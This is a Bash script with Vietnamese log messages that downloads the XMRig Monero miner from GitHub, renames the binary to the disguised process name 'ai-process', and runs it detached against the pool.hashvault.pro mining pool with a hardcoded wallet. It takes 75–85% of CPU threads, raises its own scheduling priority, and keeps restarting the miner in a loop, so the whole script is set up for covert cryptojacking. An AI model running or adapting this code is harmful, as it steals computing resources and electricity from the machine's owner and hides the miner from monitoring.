
FAKE_NAME="ai-process"
POOL_URL="pool.hashvault.pro:443"
WALLET="892Z4mTTy3UhGwqGafXpj27Qttop42wVR6yU8gv43i9H2cfHP6V8guPAWAf71cm32wU9aESsqe274ZnhW8219GMiSzLhTKK"
LOG_FILE="./xmrig.log"
RESTART_COUNT=0
MAX_RESTARTS=1000
echo "[INFO] Khởi động XMrig tối ưu hóa..." | tee -a "$LOG_FILE"
renice -n -10 $$ >/dev/null 2>&1
ionice -c2 -n0 -p $$ >/dev/null 2>&1
setup_xmrig() {
    if [ ! -f "./xmrig" ]; then
        echo "[*] Đang tải XMrig..." | tee -a $LOG_FILE
        curl -sL -o xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz
        tar -xf xmrig.tar.gz >/dev/null 2>&1
        mv xmrig-*/xmrig . && chmod +x xmrig
        rm -rf xmrig-*
    fi
    cp xmrig $FAKE_NAME
    chmod +x $FAKE_NAME
}
adjust_threads_dynamic() {
    CPU_MAX=$(nproc)
    MIN_THREADS=$(( CPU_MAX * 75 / 100 ))
    MAX_THREADS=$(( CPU_MAX * 85 / 100 ))
    THREADS=$(( MIN_THREADS + RANDOM % (MAX_THREADS - MIN_THREADS + 1) ))
}
start_task() {
    adjust_threads_dynamic
    echo "[INFO] Chạy $FAKE_NAME với $THREADS luồng CPU..." | tee -a "$LOG_FILE"
    nohup ./$FAKE_NAME \
        -o $POOL_URL \
        -u $WALLET \
        -k --tls \
        --donate-level 0 \
        --randomx-1gb-pages \
        --randomx-no-numa \
        --cpu-max-threads-hint=$THREADS \
        --threads=$THREADS \
        --log-file=$LOG_FILE \
        2>/dev/null &
    TASK_PID=$!
    disown
}
check_task() {
    kill -0 "$TASK_PID" >/dev/null 2>&1
}
setup_xmrig
start_task
while [ "$RESTART_COUNT" -lt "$MAX_RESTARTS" ]; do
    sleep 60

    if ! check_task; then
        echo "[WARN] Tiến trình dừng, khởi động lại..." | tee -a "$LOG_FILE"
        start_task
        RESTART_COUNT=$((RESTART_COUNT + 1))
    else
        adjust_threads_dynamic
        echo "[INFO] Điều chỉnh luồng CPU thành $THREADS..." | tee -a "$LOG_FILE"
        kill "$TASK_PID" >/dev/null 2>&1
        start_task
    fi
done
echo "[FATAL] Quá số lần restart, dừng script." | tee -a "$LOG_FILE"
